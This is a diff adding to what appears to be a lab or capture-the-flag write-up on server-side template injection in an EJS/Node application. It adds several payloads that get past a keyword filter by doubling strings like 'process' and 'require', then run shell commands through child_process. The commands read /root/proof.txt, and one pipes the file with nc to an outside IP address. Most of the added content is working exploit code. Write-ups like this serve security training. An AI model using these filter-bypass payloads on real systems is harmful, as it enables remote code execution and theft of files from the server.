@@ -91,6 +91,20 @@ But after saving the payload it got converted to : .mainModule.("child_").Sync("
 - To bypass we can use below payload.
 
 ```
+<%=global.proprocesscess.mainModule.requrequireire("child_proprocesscess").exexececSync("id").toString()%>
+
+<%=global.proprocesscess.mainModule.requrequireire("child_proprocesscess").exexececSync("ls").toString()%>
+
+<%=global.proprocesscess.mainModule.requrequireire("child_proprocesscess").exexececSync("find / -type f -name 'proof.txt' 2>/dev/null").toString()%>
+
+<%=global.proprocesscess.mainModule.requrequireire("child_proprocesscess").exexececSync("cat /root/proof.txt").toString()%>
+```
+
+![ssti_proof_txt](images/ssti_proof_txt.png)
+
+OR)
+
+```
 <%= proprocesscess.mainModule.requrequireire('child_procprocessess').exexecec("cat /root/proof.txt | nc 192.168.45.165 443").toString() %>?
 ```
 
